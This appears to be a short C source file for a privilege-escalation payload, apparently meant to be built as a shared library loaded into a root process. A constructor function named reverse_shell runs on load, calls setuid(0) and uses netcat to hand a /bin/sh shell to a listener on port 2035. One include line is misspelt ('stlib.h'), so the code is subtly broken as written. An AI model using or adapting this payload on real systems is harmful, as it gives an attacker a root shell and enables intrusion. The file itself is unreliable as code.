#include <stdio.h>
#include <stlib.h>
#include <sys/types.h>
#include <unistd.h>

__attribute__((__constructor__)) int reverse_shell(void){	
	setuid(0);
	system("nc -e /bin/sh 127.0.0.1 2035");
	return 0;
} 